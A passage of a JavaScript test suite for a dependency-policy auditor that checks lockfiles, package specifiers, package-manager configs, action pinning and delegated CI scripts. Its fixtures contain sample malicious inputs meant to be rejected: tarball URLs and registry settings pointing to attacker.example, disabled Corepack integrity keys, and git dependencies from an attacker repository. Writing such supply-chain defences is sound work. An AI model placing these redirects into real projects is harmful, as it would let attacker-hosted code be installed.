import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { basename, dirname, join, resolve } from 'node:path'
import test from 'node:test'
import { fileURLToPath } from 'node:url'

import {
  auditActionReferences,
  auditDependencyEvidence,
  auditDependencySpecifiers,
  auditExecutableDependencyCommands,
  collectDelegatedScripts,
  auditLicenseBaseline,
  auditLicenseReport,
  auditLockfile,
  auditLockfileLicenseBaseline,
  auditPackageManagerConfigs,
  auditSubmoduleStatus,
  auditVulnerabilityReport,
  auditWorkspacePackageManagers,
  buildLockfileLicenseBaseline,
  isAuditedActionFile,
  nestedShellBodies,
  PACKAGE_MANAGER_CONFIG_FILE,
  shellCommandSegments,
  trackedFiles,
  workflowRunCommands,
} from './dependency-policy.mjs'

test('lockfile audit requires sha512 integrity for every registry resolution', () => {
  const valid = `lockfileVersion: '6.1'
settings:
  excludeLinksFromLockfile: false
packages:
  /trusted@1.0.0:
    resolution: {integrity: sha512-YWJjZA==}
  /also-trusted@2.0.0:
    resolution: {integrity: sha512-ZGVmZw==}
`
  assert.deepEqual(auditLockfile(valid), { errors: [], packageCount: 2 })

  const invalid = valid.replace(
    'resolution: {integrity: sha512-ZGVmZw==}',
    'resolution: {tarball: https://attacker.example/package.tgz}'
  )
  assert.match(auditLockfile(invalid).errors.join('\n'), /also-trusted.*sha512/)

  const nonRegistry = `${valid}  github.com/attacker/tool/abcdef:
    resolution: {commit: abcdef}
`
  const nonRegistryAudit = auditLockfile(nonRegistry)
  assert.equal(nonRegistryAudit.packageCount, 3)
  assert.match(nonRegistryAudit.errors.join('\n'), /forbidden non-registry package resolution/)

  const duplicatePackages = `${valid}packages:
  /shadowed@3.0.0:
    resolution: {integrity: sha512-c2hhZG93ZWQ=}
`
  assert.match(auditLockfile(duplicatePackages).errors.join('\n'), /cannot be parsed unambiguously/)
})

test('lockfile audit rejects tarball overrides despite registry integrity', () => {
  const redirected = `lockfileVersion: '6.1'
settings:
  excludeLinksFromLockfile: false
packages:
  /trusted@1.0.0:
    resolution:
      integrity: sha512-YWJjZA==
      tarball: https://attacker.example/trusted-1.0.0.tgz
`
  const audit = auditLockfile(redirected)
  assert.equal(audit.packageCount, 1)
  assert.equal(audit.errors.length, 1)
  assert.match(audit.errors[0], /trusted@1\.0\.0.*forbidden tarball resolution override/)
})

test('dependency specifier audit rejects git, URL, file, and tag dependencies', () => {
  const manifests = [
    {
      file: 'package.json',
      manifest: {
        dependencies: {
          semver: '^1.2.3',
          exact: '1.2.3',
          local: 'workspace:*',
          git: 'git+ssh://git@github.com/attacker/repo.git',
          tarball: 'https://attacker.example/package.tgz',
          file: 'file:../outside',
          tag: 'latest',
          disguisedUrl: '1.2.3 || https://attacker.example/package.tgz',
        },
        pnpm: {
          overrides: {
            safe: '2.0.0',
            unsafe: 'github:attacker/repo',
          },
        },
      },
    },
  ]
  const audit = auditDependencySpecifiers(manifests)
  assert.equal(audit.specifierCount, 10)
  assert.equal(audit.errors.length, 6)
  assert.match(audit.errors.join('\n'), /git\+ssh/)
  assert.match(audit.errors.join('\n'), /https:/)
  assert.match(audit.errors.join('\n'), /file:/)
  assert.match(audit.errors.join('\n'), /latest/)
  assert.match(audit.errors.join('\n'), /github:/)
  assert.match(audit.errors.join('\n'), /1\.2\.3 \|\| https:/)
})

test('package-manager configuration audit permits only reviewed .npmrc keys', () => {
  const accepted = auditPackageManagerConfigs([
    {
      file: '.npmrc',
      source: '# hoist everything\nnode-linker=hoisted\n\n; trailing comment\n',
    },
    { file: 'external/sdk/.npmrc', source: 'node-linker = hoisted\r\n' },
  ])
  assert.deepEqual(accepted, { configCount: 2, errors: [] })

  const rejected = auditPackageManagerConfigs([
    {
      file: '.npmrc',
      source: [
        'node-linker=hoisted',
        'registry=https://attacker.example/',
        '@scope:registry=https://attacker.example/',
        'userconfig=./attacker.npmrc',
        'ignore-scripts=false',
        'strict-ssl',
      ].join('\n'),
    },
    { file: 'apps/extension/.npmrc', source: 'node-linker=hoisted\nregistry=https://attacker.example/' },
    { file: '.yarnrc.yml', source: 'npmRegistryServer: https://attacker.example/' },
    { file: '.yarnrc', source: 'registry "https://attacker.example/"' },
    { file: 'bunfig.toml', source: '[install]\nregistry = "https://attacker.example/"' },
    { file: '.pnpmfile.cjs', source: 'module.exports = { hooks: {} }' },
    {
      file: '.corepack.env',
      source: 'COREPACK_NPM_REGISTRY=https://attacker.example/\nCOREPACK_INTEGRITY_KEYS=0\n',
    },
    { file: 'apps/extension/.corepack.env', source: 'COREPACK_INTEGRITY_KEYS=0' },
    { file: 'external/sdk/.npmrc', source: 42 },
  ])
  assert.equal(rejected.configCount, 9)
  assert.equal(rejected.errors.length, 13)
  assert.match(rejected.errors.join('\n'), /^\.npmrc: unreviewed package-manager configuration key: registry$/m)
  assert.match(rejected.errors.join('\n'), /configuration key: @scope:registry$/m)
  assert.match(rejected.errors.join('\n'), /configuration key: userconfig$/m)
  assert.match(rejected.errors.join('\n'), /configuration key: ignore-scripts$/m)
  assert.match(rejected.errors.join('\n'), /configuration key: strict-ssl$/m)
  assert.match(rejected.errors.join('\n'), /^apps\/extension\/\.npmrc: .*key: registry$/m)
  assert.match(rejected.errors.join('\n'), /^\.yarnrc\.yml: unreviewed package-manager configuration file$/m)
  assert.match(rejected.errors.join('\n'), /^\.yarnrc: unreviewed/m)
  assert.match(rejected.errors.join('\n'), /^bunfig\.toml: unreviewed/m)
  assert.match(rejected.errors.join('\n'), /^\.pnpmfile\.cjs: unreviewed/m)
  assert.match(
    rejected.errors.join('\n'),
    /^\.corepack\.env: unreviewed package-manager configuration file$/m
  )
  assert.match(rejected.errors.join('\n'), /^apps\/extension\/\.corepack\.env: unreviewed/m)
  assert.match(rejected.errors.join('\n'), /configuration must be text/)
  assert.doesNotMatch(rejected.errors.join('\n'), /node-linker/)
})

test('workspace package-manager audit requires the exact pin in every declaring manifest', () => {
  const accepted = auditWorkspacePackageManagers([
    { file: 'package.json', manifest: { packageManager: 'pnpm@8.6.0' } },
    { file: 'packages/wallet-core/package.json', manifest: { name: '@qbit/wallet-core' } },
    { file: 'external/qbit-js/package.json', manifest: { packageManager: 'pnpm@8.6.0' } },
  ])
  assert.deepEqual(accepted, { errors: [], manifestCount: 3 })

  const rejected = auditWorkspacePackageManagers([
    { file: 'package.json', manifest: { packageManager: 'pnpm@8.6.0' } },
    { file: 'external/qbit-js/package.json', manifest: { packageManager: 'pnpm@latest' } },
    { file: 'external/qbit-pqc/package.json', manifest: { packageManager: 'pnpm@9.1.0' } },
    { file: 'packages/wallet-core/package.json', manifest: { packageManager: 'yarn@4.1.0' } },
    { file: 'apps/extension/package.json', manifest: { packageManager: 'pnpm@8.6.0+sha512.abc' } },
    { file: 'packages/wallet-api/package.json', manifest: { packageManager: null } },
  ])
  assert.equal(rejected.manifestCount, 6)
  assert.equal(rejected.errors.length, 5)
  assert.match(
    rejected.errors.join('\n'),
    /^external\/qbit-js\/package\.json: packageManager must be exactly pnpm@8\.6\.0, found "pnpm@latest"$/m
  )
  assert.match(
    rejected.errors.join('\n'),
    /^external\/qbit-pqc\/package\.json: .*found "pnpm@9\.1\.0"$/m
  )
  assert.match(
    rejected.errors.join('\n'),
    /^packages\/wallet-core\/package\.json: .*found "yarn@4\.1\.0"$/m
  )
  assert.match(
    rejected.errors.join('\n'),
    /^apps\/extension\/package\.json: .*found "pnpm@8\.6\.0\+sha512\.abc"$/m
  )
  assert.match(rejected.errors.join('\n'), /^packages\/wallet-api\/package\.json: .*found null$/m)
  assert.doesNotMatch(rejected.errors.join('\n'), /^package\.json:/m)

  const rootMutable = auditWorkspacePackageManagers([
    { file: 'package.json', manifest: { packageManager: 'pnpm@latest' } },
  ])
  assert.deepEqual(rootMutable.errors, [
    'package.json: packageManager must be exactly pnpm@8.6.0, found "pnpm@latest"',
  ])

  // The root pin is required even when a nested manifest declares it correctly.
  for (const manifests of [
    [{ file: 'package.json', manifest: {} }],
    [{ file: 'packages/wallet-core/package.json', manifest: { packageManager: 'pnpm@8.6.0' } }],
  ]) {
    assert.deepEqual(auditWorkspacePackageManagers(manifests).errors, [
      'package.json: packageManager must remain pinned to pnpm@8.6.0',
    ])
  }
})

test('package-manager configuration discovery covers tracked Corepack environment files', () => {
  for (const file of [
    '.corepack.env',
    'apps/extension/.corepack.env',
    'external/qbit-js/packages/api/.corepack.env',
  ]) {
    assert.ok(PACKAGE_MANAGER_CONFIG_FILE.test(file), `${file} must be audited`)
  }
  assert.ok(!PACKAGE_MANAGER_CONFIG_FILE.test('.env'))
})

test('action audit accepts only local actions or full lowercase commit IDs', () => {
  const audit = auditActionReferences([
    {
      file: '.github/workflows/ci.yml',
      source: [
        'steps:',
        '  - uses: ./local-action',
        `  - uses: actions/checkout@${'a'.repeat(40)} # v4`,
        '  - uses: actions/setup-node@v4',
        `  - uses: owner/action@${'B'.repeat(40)}`,
        '  - { name: Flow action, uses: "owner/flow-action@v1" }',
        '  # - uses: ignored/comment@v1',
        '  - { uses: ./local-flow-action }',
        '  - { "uses": "owner/quoted-key@v1" }',
        'flowSteps: [uses: "owner/sequence-action@v1"]',
      ].join('\n'),
    },
  ])
  assert.equal(audit.actionCount, 8)
  assert.equal(audit.errors.length, 5)
  assert.match(audit.errors[0], /setup-node@v4/)
  assert.match(audit.errors[1], /owner\/action/)
  assert.match(audit.errors[2], /owner\/flow-action@v1/)
  assert.match(audit.errors[3], /owner\/quoted-key@v1/)
  assert.match(audit.errors[4], /owner\/sequence-action@v1/)
})

test('action audit fails closed for malformed YAML and non-string references', () => {
  const audit = auditActionReferences([
    {
      file: '.github/workflows/non-string.yml',
      source: 'steps:\n  - uses: [owner/action, v1]\n  - uses:',
    },
    {
      file: '.github/workflows/malformed.yml',
      source: 'steps: [',
    },
  ])
  assert.equal(audit.actionCount, 2)
  assert.equal(audit.errors.length, 3)
  assert.match(audit.errors.join('\n'), /action reference must be a non-empty string/)
  assert.match(audit.errors.join('\n'), /workflow YAML cannot be parsed/)
})

test('action discovery audits every tracked local action definition', () => {
  for (const file of [
    '.github/workflows/ci.yml',
    'apps/extension/.github/actions/setup/action.yaml',
    'tools/my-action/action.yml',
    'packages/release/actions/publish/action.yaml',
  ]) {
    assert.ok(isAuditedActionFile(file), `${file} must be audited`)
  }
  for (const file of [
    'docs/config.yml',
    'pnpm-lock.yaml',
    'tools/my-action/README.md',
    'tools/my-action/steps.yml',
    'tools/my-action/action.json',
    'tools/action.yml.md',
    '.github/CODEOWNERS',
  ]) {
    assert.equal(isAuditedActionFile(file), false, `${file} must not be audited`)
  }

  const repoRoot = mkdtempSync(join(tmpdir(), 'dependency-policy-actions-'))
  try {
    const fixtureFiles = {
      '.github/workflows/ci.yml': [
        'jobs:',
        '  build:',
        '    steps:',
        '      - uses: ./tools/my-action',
        '',
      ].join('\n'),
      'tools/my-action/action.yml': [
        'name: Local action',
        'runs:',
        '  using: composite',
        '  steps:',
        '    - uses: actions/setup-node@v4',
        '    - run: npx unpinned-tool verify',
        '      shell: bash',
        '',
      ].join('\n'),
      'docs/config.yml': 'uses: owner/decoy@v1\n',
    }
    for (const [file, source] of Object.entries(fixtureFiles)) {
      mkdirSync(join(repoRoot, dirname(file)), { recursive: true })
      writeFileSync(join(repoRoot, file), source)
    }
    execFileSync('git', ['init', '-q'], { cwd: repoRoot })
    execFileSync('git', ['add', '-A'], { cwd: repoRoot })

    const actionFiles = trackedFiles(repoRoot)
      .filter(isAuditedActionFile)
      .map(file => ({ file, source: readFileSync(join(repoRoot, file), 'utf8') }))
    assert.deepEqual(actionFiles.map(({ file }) => file).sort(), [
      '.github/workflows/ci.yml',
      'tools/my-action/action.yml',
    ])

    const actionAudit = auditActionReferences(actionFiles)
    assert.equal(actionAudit.actionCount, 2)
    assert.deepEqual(actionAudit.errors, [
      'tools/my-action/action.yml: action is not pinned to a full commit: actions/setup-node@v4',
    ])

    const commandAudit = auditExecutableDependencyCommands(
      actionFiles.map(({ file, source }) => ({ file, commands: [source] }))
    )
    assert.match(commandAudit.errors.join('\n'), /^tools\/my-action\/action\.yml: .*unpinned-tool/m)
  } finally {
    rmSync(repoRoot, { recursive: true, force: true })
  }
})

test('action audit rejects local action runtimes whose implementation is not audited', () => {
  const unaudited = ['node12', 'node16', 'node20', 'node24', 'docker', 'go1.21']
  const audit = auditActionReferences(
    unaudited.map(using => ({
      file: `tools/${using}-action/action.yml`,
      source: `name: Local action\nruns:\n  using: ${using}\n  main: index.js\n`,
    }))
  )
  assert.equal(audit.actionCount, 0)
  assert.deepEqual(
    audit.errors,
    unaudited.map(
      using =>
        `tools/${using}-action/action.yml: local action runtime "${using}" is rejected because its executable implementation is not audited; only composite actions are accepted`
    )
  )
})

test('action audit fails closed on a missing or malformed runtime and keeps composite actions', () => {
  const audit = auditActionReferences([
    { file: 'tools/no-runs/action.yml', source: 'name: No runs\ninputs: {}\n' },
    { file: 'tools/no-using/action.yml', source: 'name: No runtime\nruns:\n  main: index.js\n' },
    {
      file: 'tools/list-using/action.yaml',
      source: 'name: List runtime\nruns:\n  using:\n    - composite\n',
    },
    { file: 'tools/empty/action.yml', source: '\n' },
    {
      file: 'tools/composite/action.yml',
      source: [
        'name: Composite',
        'runs:',
        '  using: composite',
        '  steps:',
        `    - uses: actions/checkout@${'a'.repeat(40)}`,
        '    - run: echo ok',
        '      shell: bash',
        '',
      ].join('\n'),
    },
    // Ordinary workflow YAML declares jobs rather than runs, so it must not be
    // read as an action definition.
    {
      file: '.github/workflows/ci.yml',
      source: 'jobs:\n  build:\n    steps:\n      - run: echo ok\n',
    },
  ])
  assert.equal(audit.actionCount, 1)
  assert.deepEqual(audit.errors, [
    'tools/no-runs/action.yml: local action definition must declare a runs section',
    'tools/no-using/action.yml: local action definition must declare a string runs.using runtime',
    'tools/list-using/action.yaml: local action definition must declare a string runs.using runtime',
    'tools/empty/action.yml: local action definition must declare a runs section',
  ])
})

test('action runtime audit closes the JavaScript and Docker entrypoint bypass', () => {
  const repoRoot = mkdtempSync(join(tmpdir(), 'dependency-policy-action-runtime-'))
  try {
    const fixtureFiles = {
      '.github/workflows/ci.yml': [
        'jobs:',
        '  build:',
        '    steps:',
        '      - uses: ./tools/js-action',
        '      - uses: ./tools/docker-action',
        '',
      ].join('\n'),
      'tools/js-action/action.yml': [
        'name: JS action',
        'runs:',
        '  using: node20',
        '  main: index.js',
        '',
      ].join('\n'),
      // The runner executes this entrypoint, but it is not YAML and so never
      // joins the audited file set: nothing here reaches the command audit.
      'tools/js-action/index.js': [
        "import { execSync } from 'node:child_process'",
        "execSync('npx mutable-tool@latest')",
        '',
      ].join('\n'),
      'tools/docker-action/action.yml': [
        'name: Docker action',
        'runs:',
        '  using: docker',
        '  image: docker://ghcr.io/example/tool:latest',
        '',
      ].join('\n'),
    }
    for (const [file, source] of Object.entries(fixtureFiles)) {
      mkdirSync(join(repoRoot, dirname(file)), { recursive: true })
      writeFileSync(join(repoRoot, file), source)
    }
    execFileSync('git', ['init', '-q'], { cwd: repoRoot })
    execFileSync('git', ['add', '-A'], { cwd: repoRoot })

    const actionFiles = trackedFiles(repoRoot)
      .filter(isAuditedActionFile)
      .map(file => ({ file, source: readFileSync(join(repoRoot, file), 'utf8') }))
    assert.deepEqual(
      actionFiles.map(({ file }) => file),
      ['.github/workflows/ci.yml', 'tools/docker-action/action.yml', 'tools/js-action/action.yml']
    )

    // The mutable installer and the mutable image tag both sit outside the
    // audited commands, so rejecting the runtime is what fails the policy.
    const commandAudit = auditExecutableDependencyCommands(
      actionFiles.map(({ file, source }) => ({ file, commands: [source] }))
    )
    assert.deepEqual(commandAudit.errors, [])
    assert.deepEqual(auditActionReferences(actionFiles).errors, [
      'tools/docker-action/action.yml: local action runtime "docker" is rejected because its executable implementation is not audited; only composite actions are accepted',
      'tools/js-action/action.yml: local action runtime "node20" is rejected because its executable implementation is not audited; only composite actions are accepted',
    ])
  } finally {
    rmSync(repoRoot, { recursive: true, force: true })
  }
})

// Builds a throwaway git repository whose index is the tracked file set, runs
// the delegated-script walk from the same roots the policy uses — every
// manifest's scripts and every workflow or action `run` body — and audits
// whatever the walk reached.
function auditDelegatedFixture(prefix, fixtureFiles, untrackedFiles = {}) {
  const repoRoot = mkdtempSync(join(tmpdir(), prefix))
  try {
    for (const [file, source] of Object.entries(fixtureFiles)) {
      mkdirSync(join(repoRoot, dirname(file)), { recursive: true })
      writeFileSync(join(repoRoot, file), source)
    }
    execFileSync('git', ['init', '-q'], { cwd: repoRoot })
    execFileSync('git', ['add', '-A'], { cwd: repoRoot })
    for (const [file, source] of Object.entries(untrackedFiles)) {
      mkdirSync(join(repoRoot, dirname(file)), { recursive: true })
      writeFileSync(join(repoRoot, file), source)
    }

    const files = trackedFiles(repoRoot)
    const read = file => readFileSync(join(repoRoot, file), 'utf8')
    const roots = files.flatMap(file => {
      if (basename(file) === 'package.json') {
        const manifest = JSON.parse(read(file))
        return [
          {
            file,
            commands: Object.values(manifest.scripts || {}).filter(
              command => typeof command === 'string'
            ),
          },
        ]
      }
      return isAuditedActionFile(file) ? [{ file, commands: workflowRunCommands(read(file)) }] : []
    })
    const delegated = collectDelegatedScripts(roots, {
      trackedFiles: files,
      readTrackedFile: read,
    })
    return {
      discoveryErrors: delegated.errors,
      scripts: delegated.scripts.map(({ file }) => file),
      auditErrors: auditExecutableDependencyCommands(delegated.scripts).errors,
    }
  } finally {
    rmSync(repoRoot, { recursive: true, force: true })
  }
}

test('delegated script audit follows manifest scripts and workflow run steps into the scripts they execute', () => {
  const audit = auditDelegatedFixture('dependency-policy-delegated-', {
    '.github/workflows/ci.yml': [
      'jobs:',
      '  build:',
      '    steps:',
      '      - run: scripts/ci/bootstrap.sh',
      '      - run: corepack pnpm run build',
      '',
    ].join('\n'),
    'package.json': `${JSON.stringify({ scripts: { lint: 'bash scripts/ci/lint.sh' } }, null, 2)}\n`,
    // A workspace manifest runs its scripts from its own directory, so this
    // path has to resolve under packages/tool rather than the repository root.
    'packages/tool/package.json': `${JSON.stringify(
      { scripts: { build: 'scripts/build.sh' } },
      null,
      2
    )}\n`,
    'packages/tool/scripts/build.sh': [
      '#!/usr/bin/env bash',
      'npm exec -- build-tool@latest',
      '',
    ].join('\n'),
    // Delegates on through a sourced sibling, a nested script, and back to
    // itself, so the walk has to resolve `$0`, recurse, and break the cycle.
    'scripts/ci/bootstrap.sh': [
      '#!/usr/bin/env bash',
      'source "$(dirname "$0")/env.sh"',
      'scripts/ci/nested.sh',
      '',
    ].join('\n'),
    'scripts/ci/env.sh': ['#!/usr/bin/env bash', 'npx mutable-tool@latest', ''].join('\n'),
    'scripts/ci/nested.sh': [
      '#!/usr/bin/env bash',
      'corepack pnpm dlx nested-tool@latest',
      'bash scripts/ci/bootstrap.sh',
      '',
    ].join('\n'),
    'scripts/ci/lint.sh': ['#!/usr/bin/env bash', 'npm exec -- lint-tool@latest', ''].join('\n'),
    // Named by nothing the repository runs, so it must stay out of the audit.
    'scripts/ci/unreferenced.sh': [
      '#!/usr/bin/env bash',
      'npx unreferenced-tool@latest',
      '',
    ].join('\n'),
  })

  assert.deepEqual(audit.discoveryErrors, [])
  assert.deepEqual(audit.scripts.sort(), [
    'packages/tool/scripts/build.sh',
    'scripts/ci/bootstrap.sh',
    'scripts/ci/env.sh',
    'scripts/ci/lint.sh',
    'scripts/ci/nested.sh',
  ])
  assert.deepEqual(audit.auditErrors.sort(), [
    'packages/tool/scripts/build.sh: executable package is not pinned to an exact version: build-tool@latest',
    'scripts/ci/env.sh: executable package is not pinned to an exact version: mutable-tool@latest',
    'scripts/ci/lint.sh: executable package is not pinned to an exact version: lint-tool@latest',
    'scripts/ci/nested.sh: executable package is not pinned to an exact version: nested-tool@latest',
  ])
  assert.doesNotMatch(audit.auditErrors.join('\n'), /unreferenced-tool/)
})

test('delegated script audit fails closed on scripts it cannot resolve', () => {
  const audit = auditDelegatedFixture(
    'dependency-policy-delegated-unresolved-',
    {
      '.github/workflows/ci.yml': [
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: bash scripts/ci/missing.sh',
        '      - run: bash "$RUNNER_TEMP/tool.sh"',
        '      - run: source ../../../outside/tool.sh',
        '      - run: bash scripts/ci/untracked.sh',
        '      - run: bash -c "npx inline-tool@latest"',
        '',
      ].join('\n'),
    },
    { 'scripts/ci/untracked.sh': '#!/usr/bin/env bash\nnpx untracked-tool@latest\n' }
  )

  assert.deepEqual(audit.discoveryErrors.sort(), [
    '.github/workflows/ci.yml: delegated script is not a tracked repository file: scripts/ci/missing.sh',
    '.github/workflows/ci.yml: delegated script is not a tracked repository file: scripts/ci/untracked.sh',
    '.github/workflows/ci.yml: delegated script path escapes the repository root: ../../../outside/tool.sh',
    '.github/workflows/ci.yml: delegated script path is not a literal repository path: $RUNNER_TEMP/tool.sh',
  ])
  // `bash -c` runs an inline body the workflow audit already reads as text, so
  // it is not a missing script reference.
  assert.deepEqual(audit.scripts, [])
})

test('delegated script audit follows scripts named inside command and process substitutions', () => {
  const script = name => ['#!/usr/bin/env bash', `npx ${name}-tool@latest`, ''].join('\n')
  const audit = auditDelegatedFixture('dependency-policy-delegated-nested-', {
    '.github/workflows/ci.yml': [
      'jobs:',
      '  build:',
      '    steps:',
      '      - run: echo "$(./scripts/ci/bootstrap.sh)"',
      '      - run: echo `./scripts/ci/backtick.sh`',
      '      - run: version="$(node -p "$(./scripts/ci/nested.sh)")"',
      '      - run: diff <(./scripts/ci/left.sh) <(./scripts/ci/right.sh)',
      '      - run: total=$((1 + $(./scripts/ci/count.sh))) && sleep "$((total * 2))"',
      // The old segmentation cut this substitution at `;`, leaving a trailing
      // ` bash ./scripts/ci/second.sh)` segment whose operand could never
      // resolve; both scripts are followed and nothing junk is reported.
      '      - run: echo $(./scripts/ci/first.sh; bash ./scripts/ci/second.sh)',
      '',
    ].join('\n'),
    // A substitution inside double quotes runs; inside single quotes it is
    // literal text, so the script it names stays out of the audit.
    'package.json': `${JSON.stringify(
      {
        scripts: {
          quoted: 'echo "$(./scripts/ci/quoted.sh)"',
          literal: "echo '$(./scripts/ci/literal.sh)' \"\\$(./scripts/ci/escaped.sh)\"",
        },
      },
      null,
      2
    )}\n`,
    'scripts/ci/bootstrap.sh': script('bootstrap'),
    'scripts/ci/backtick.sh': script('backtick'),
    'scripts/ci/nested.sh': script('nested'),
    'scripts/ci/left.sh': script('left'),
    'scripts/ci/right.sh': script('right'),
    'scripts/ci/count.sh': script('count'),
    'scripts/ci/first.sh': script('first'),
    'scripts/ci/second.sh': script('second'),
    'scripts/ci/quoted.sh': script('quoted'),
    'scripts/ci/literal.sh': script('literal'),
    'scripts/ci/escaped.sh': script('escaped'),
  })

  assert.deepEqual(audit.discoveryErrors, [])
  const followed = [
    'backtick',
    'bootstrap',
    'count',
    'first',
    'left',
    'nested',
    'quoted',
    'right',
    'second',
  ]
  assert.deepEqual(
    audit.scripts.sort(),
    followed.map(name => `scripts/ci/${name}.sh`)
  )
  assert.deepEqual(
    audit.auditErrors.sort(),
    followed.map(
      name =>
        `scripts/ci/${name}.sh: executable package is not pinned to an exact version: ${name}-tool@latest`
    )
  )
})

test('delegated script audit follows scripts named inside inline shell bodies', () => {
  const script = name => ['#!/usr/bin/env bash', `npx ${name}-tool@latest`, ''].join('\n')
  const audit = auditDelegatedFixture('dependency-policy-delegated-inline-', {
    '.github/workflows/ci.yml': [
      'jobs:',
      '  build:',
      '    steps:',
      "      - run: bash -c './scripts/ci/bootstrap.sh'",
      '      - run: sh -lc "./scripts/ci/login.sh"',
      '      - run: eval ./scripts/ci/evaluated.sh',
      "      - run: npx -c './scripts/ci/called.sh'",
      "      - run: npm exec --call 'bash ./scripts/ci/exec.sh'",
      // A substitution inside an inline body is one level deeper still.
      '      - run: bash -c \'echo "$(./scripts/ci/deep.sh)"\'',
      '',
    ].join('\n'),
    'scripts/ci/bootstrap.sh': script('bootstrap'),
    'scripts/ci/login.sh': script('login'),
    'scripts/ci/evaluated.sh': script('evaluated'),
    'scripts/ci/called.sh': script('called'),
    'scripts/ci/exec.sh': script('exec'),
    'scripts/ci/deep.sh': script('deep'),
  })

  assert.deepEqual(audit.discoveryErrors, [])
  const followed = ['bootstrap', 'called', 'deep', 'evaluated', 'exec', 'login']
  assert.deepEqual(
    audit.scripts.sort(),
    followed.map(name => `scripts/ci/${name}.sh`)
  )
  assert.deepEqual(
    audit.auditErrors.sort(),
    followed.map(
      name =>
        `scripts/ci/${name}.sh: executable package is not pinned to an exact version: ${name}-tool@latest`
    )
  )
})

test('delegated script audit fails closed on nested scripts it cannot resolve or read', () => {
  const audit = auditDelegatedFixture(
    'dependency-policy-delegated-nested-unresolved-',
    {
      '.github/workflows/ci.yml': [
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: echo "$(./scripts/ci/untracked.sh)"',
        '      - run: echo `bash ./scripts/ci/missing.sh`',
        "      - run: sh -c 'diff <(./scripts/ci/absent.sh) <(cat)'",
        // An unterminated substitution is malformed shell; its body still
        // runs to the end of the command rather than being dropped, so a
        // tracked script there is collected and an untracked one is reported.
        '      - run: echo "$(./scripts/ci/bootstrap.sh',
        '      - run: echo `./scripts/ci/open.sh',
        `      - run: echo ${'$('.repeat(10)}./scripts/ci/deep.sh${')'.repeat(10)}`,
        '',
      ].join('\n'),
      'scripts/ci/bootstrap.sh': ['#!/usr/bin/env bash', 'npx bootstrap-tool@latest', ''].join('\n'),
      'scripts/ci/deep.sh': ['#!/usr/bin/env bash', 'npx deep-tool@latest', ''].join('\n'),
    },
    { 'scripts/ci/untracked.sh': '#!/usr/bin/env bash\nnpx untracked-tool@latest\n' }
  )

  assert.deepEqual(audit.discoveryErrors.sort(), [
    '.github/workflows/ci.yml: delegated script is not a tracked repository file: ./scripts/ci/absent.sh',
    '.github/workflows/ci.yml: delegated script is not a tracked repository file: ./scripts/ci/missing.sh',
    '.github/workflows/ci.yml: delegated script is not a tracked repository file: ./scripts/ci/open.sh',
    '.github/workflows/ci.yml: delegated script is not a tracked repository file: ./scripts/ci/untracked.sh',
    '.github/workflows/ci.yml: nested shell command is deeper than the audit follows: $(./scripts/ci/deep.sh)',
  ])
  assert.deepEqual(audit.scripts, ['scripts/ci/bootstrap.sh'])
  assert.deepEqual(audit.auditErrors, [
    'scripts/ci/bootstrap.sh: executable package is not pinned to an exact version: bootstrap-tool@latest',
  ])
})

test('shell command segmentation keeps substitutions opaque', () => {
  assert.deepEqual(shellCommandSegments('echo $(a; b) | c'), ['echo $(a; b) ', ' c'])
  assert.deepEqual(shellCommandSegments('echo `a; b` && c'), ['echo `a; b` ', '', ' c'])
  assert.deepEqual(shellCommandSegments('diff <(a | b) >(c; d); e'), ['diff <(a | b) >(c; d)', ' e'])
  assert.deepEqual(shellCommandSegments('echo "$(a; $(b | c))"; d'), ['echo "$(a; $(b | c))"', ' d'])
  assert.deepEqual(shellCommandSegments('x=$((a | b)); y'), ['x=$((a | b))', ' y'])
  assert.deepEqual(shellCommandSegments("echo '$(a; b)'; c"), ["echo '$(a; b)'", ' c'])
  // A substitution that never closes is malformed shell; nothing after it is
  // dropped, it is all one command the walk still reads.
  assert.deepEqual(shellCommandSegments('echo $(a; b'), ['echo $(a; b'])
})

test('nested shell bodies follow shell quoting', () => {
  assert.deepEqual(nestedShellBodies('echo "$(a b)" `c` <(d) >(e)'), ['a b', 'c', 'd', 'e'])
  assert.deepEqual(nestedShellBodies('$(a $(b))'), ['a $(b)'])
  assert.deepEqual(nestedShellBodies("echo '$(a)' \"\\$(b)\" \"<(c)\" \\$(d)"), [])
  assert.deepEqual(nestedShellBodies('echo $((1 + $(a))) $((b + 1))'), ['a'])
  assert.deepEqual(nestedShellBodies('echo "$(a ")" \')\' \\))" $(b'), ['a ")" \')\' \\)', 'b'])
  assert.deepEqual(nestedShellBodies('`a \\`b\\``'), ['a `b`'])
  assert.deepEqual(nestedShellBodies("`a 'b` c'"), ["a 'b"])
  assert.deepEqual(nestedShellBodies('echo $((a) ) $(b'), ['(a) ', 'b'])
})

test('delegated script audit still rejects a dynamic executable name inside a reached script', () => {
  const audit = auditDelegatedFixture('dependency-policy-delegated-dynamic-', {
    '.github/workflows/ci.yml': [
      'jobs:',
      '  build:',
      '    steps:',
      '      - run: scripts/ci/run.sh',
      '',
    ].join('\n'),
    // Every one of these gives the executable a name the audit cannot read
    // textually, and a locally assigned value is no defence: `printf -v`,
    // `read`, `eval`, a nameref, or a later branch can all rebind the
    // parameter after the assignment the audit can see.
    'scripts/ci/run.sh': [
      '#!/usr/bin/env bash',
      'PM=echo',
      '$PM mutable-tool@latest',
      '"$PM" mutable-tool@latest',
      '${PM} mutable-tool@latest',
      'RUNNER=(echo)',
      '"${RUNNER[@]}" mutable-tool@latest',
      'printf -v LATER npx',
      '$LATER mutable-tool@latest',
      'read -r PICKED < choice',
      '$PICKED mutable-tool@latest',
      'X=',
      'np${X}x mutable-tool@latest',
      '$(printf npx) mutable-tool@latest',
      './bin/$PM mutable-tool@latest',
      '',
    ].join('\n'),
  })

  assert.deepEqual(audit.discoveryErrors, [])
  assert.deepEqual(audit.scripts, ['scripts/ci/run.sh'])
  const expansions = audit.auditErrors.filter(error => error.includes('shell expansion'))
  assert.deepEqual(expansions.sort(), [
    'scripts/ci/run.sh: executable command name uses shell expansion: $(printf',
    'scripts/ci/run.sh: executable command name uses shell expansion: $LATER',
    'scripts/ci/run.sh: executable command name uses shell expansion: $PICKED',
    'scripts/ci/run.sh: executable command name uses shell expansion: $PM',
    'scripts/ci/run.sh: executable command name uses shell expansion: $PM',
    'scripts/ci/run.sh: executable command name uses shell expansion: ${PM}',
